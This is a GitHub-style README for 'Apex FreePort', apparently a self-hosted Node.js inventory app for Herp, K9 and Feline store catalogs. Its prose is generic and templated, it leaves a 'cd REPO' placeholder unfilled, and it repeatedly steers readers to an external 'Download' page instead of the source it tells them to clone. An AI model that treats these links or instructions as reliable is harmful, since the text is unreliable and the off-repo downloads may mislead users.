# Apex FreePort - E-commerce Inventory Management 2026

> **Apex FreePort is a self-hosted Node.js web application that brings multi-store product catalogs, inventory records, and administrative operations into one centralized dashboard.**

[![Platform](https://img.shields.io/badge/Platform-Node.js%20web%20application-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Not%20specified-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/victorcolelv8729/apex-freeport-stock-hub?style=flat-square)](https://github.com/victorcolelv8729/apex-freeport-stock-hub)

---

<p align="center">
  <a href="https://victorcolelv8729.github.io/apex-freeport-stock-hub/">
    <img src="https://img.shields.io/badge/Download-Apex%20FreePort%20Latest-brightgreen?style=for-the-badge" alt="Download Apex FreePort">
  </a>
</p>

> **[Download Apex FreePort](https://victorcolelv8729.github.io/apex-freeport-stock-hub/)**

---

[Download Latest Build](https://victorcolelv8729.github.io/apex-freeport-stock-hub/)

---

## Overview

Apex FreePort gives small e-commerce teams a single place to organize products across several stores. Inventory entries can hold details including SKU, quantity, price, lane, and status. The application also provides distinct catalog handling for Herp, K9, and Feline stores.

Alongside its authenticated administration dashboard, the application exposes REST API endpoints, an optional public product feed, webhook functionality, and a health check route. Because it is self-hosted, teams can run the inventory service within their own Node.js environment.

---

## Capabilities

- Maintain SKU, quantity, price, lane, and status values for store inventory
- Operate Herp, K9, and Feline catalogs from a shared application
- Turn the public product feed on or off as needed
- Manage operations through an authenticated administrator dashboard
- Integrate product and inventory workflows through REST API endpoints
- Support event-based integrations with webhooks
- Verify application availability through a health check endpoint
- Keep the service running continuously with `systemd`

---

## Getting Started

Check out the repository, enter its directory, and install the required Node.js packages:

```bash
git clone https://github.com/victorcolelv8729/apex-freeport-stock-hub.git
cd REPO
npm install
```

Launch the web application with the standard project command:

```bash
npm start
```

When deploying for continued operation, create a `systemd` service. This allows the application to run independently rather than relying on an open interactive shell.

---

## Typical Workflow

A standard setup and operating sequence is:

1. Launch the Node.js application.
2. Visit the web interface from a browser.
3. Authenticate through the administration dashboard.
4. Select and configure the appropriate Herp, K9, or Feline store catalog.
5. Create or revise inventory information, including SKU, quantity, price, lane, and status.
6. Call the REST API when product or inventory actions need to be automated.
7. Activate the public product feed if an external catalog view is required.
8. Use the health endpoint for deployment checks and monitoring.

Webhooks can support store-related event handling and coordination, depending on the surrounding e-commerce environment.

---

## Runtime Configuration

Before the first startup, inspect the repository's deployment and runtime configuration files and provide values for the settings relevant to your installation:

- Administrator authentication
- Store and catalog choices
- Public product feed status
- REST API access
- Webhook connections
- Service runtime and network options

For production use, run the application under a dedicated service account and connect its startup command to a `systemd` unit.

---

## Requirements

- Node.js runtime
- A compatible package manager, such as npm
- A local machine or server that can host a Node.js web application
- Storage for application and inventory information
- Network connectivity for dashboard, API, feed, and webhook operations
- `systemd` when persistent service management is used for the deployment

---

## Frequently Asked Questions

### What type of organization can use Apex FreePort?

Apex FreePort is designed for small e-commerce operations seeking self-hosted management of inventory and product catalogs across multiple stores.

### What store categories are available?

The identified product profile includes Herp, K9, and Feline catalogs for multi-store use.

### Where are products and inventory maintained?

Administrators can manage them in the authenticated dashboard. Automated processes may instead use the product and inventory REST API endpoints.

### Is the public product feed optional?

Yes. Administrators can toggle the public product feed to control whether it is exposed.

### How can I run the application continuously?

Set up Apex FreePort as a `systemd` service for persistent hosting, and use its health check endpoint to confirm that the service is available.

### What steps help diagnose an unavailable application?

First verify that the Node.js process is active. Then inspect the service configuration and logs, check the configured network settings, and request the health check endpoint.

### Where do updates come from?

Obtain updated project files through the repository and the latest available build link. Before restarting a hosted instance, review any configuration changes included with the update.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
